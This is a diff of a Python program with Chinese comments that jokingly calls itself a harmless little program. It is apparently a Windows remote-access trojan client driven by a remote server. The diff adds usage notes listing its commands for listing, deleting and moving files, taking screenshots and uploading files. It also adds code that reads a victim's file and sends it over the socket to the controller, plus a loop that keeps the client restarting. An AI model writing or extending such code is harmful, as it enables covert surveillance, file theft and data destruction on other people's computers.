@@ -1,6 +1,16 @@
 #!/usr/bin/python
 # -*- coding: UTF-8 -*-
 #这是一个人畜无害，相当温和，德芙般丝滑的小程序
+'''
+此程序使用说明：
+	此程序由远程服务器控制，并使用自制的终端工具进行操作
+	工具包含 ls，we，cd，rm，mv，gp，up 七个工具
+	大多命令行工具都与Linux操作类似
+	"./"使用"."替换，注意！此程序为Windows基础，注意路径
+	gp为获取屏幕截图 参数路径需要尾部加入“\\”结尾
+	up为上传文件
+	we为获取当前目录位置
+'''
 import os
 import socket
 import time
@@ -104,7 +114,7 @@ class WinControl():
 
 	def ls(self):
 		#用于列出此目录下文件的函数
-		if self.patha == "./":
+		if self.patha == ".":
 			path = "\\".join(self.path)
 		else:
 			path = self.patha
@@ -183,14 +193,44 @@ class Socketz():
 		while True:
 			cmd = self.sock.recv(1024).decode("utf-8")
 			cmd = cmd.split("@")
-			data = cmdx(cmd)
-			if data == None:
-				data = "None"
-			self.sock.send(data.encode("utf-8"))
+
+			if cmd[0] == "up":
+
+				self.data = cmd[1]
+
+				print("进入上传模式")
+				f = open(self.data,"rb")
+
+				size = os.stat(self.data).st_size #获取文件大小
+				#发送文件大小 
+
+				self.sock.send(str(size).encode("utf-8"))
+				print(size)
+
+				#打印服务器反馈
+				server_reply = self.sock.recv(1024).decode("utf-8")
+				print(str(server_reply))
+
+				for x in f:
+					self.sock.send(x)
+
+
+				print("发送完成")
+
+				#打印服务器反馈
+				server_reply = self.sock.recv(1024).decode("utf-8")
+				print(str(server_reply))		
+				
+			else:	
+				data = cmdx(cmd)
+				if data == None:
+					data = "None"
+				self.sock.send(data.encode("utf-8"))
 
 
 	def stop(self):
 		self.sock.close()
+
 
 
 def cmdx(cmd):
@@ -199,7 +239,7 @@ def cmdx(cmd):
 		if len(cmd) > 1:
 			windows.patha = cmd[1]
 		else:
-			windows.patha = "./"
+			windows.patha = "."
 		p = windows.ls()
 		return p
 
@@ -271,19 +311,17 @@ def main():
 
 
 
-'''
-
-	if cmd[0] == "upload":
-
-
-	
-	if cmd[0] == "":
-'''
-
 if __name__=='__main__':
-	windows = WinControl()
-	main()
-
+	while True:	
+		#try:
+			windows = WinControl()
+			main()
+			'''
+		except:
+			time.sleep(5)
+			print("核心出错！进行重启！")
+		
+'''
 
 
 
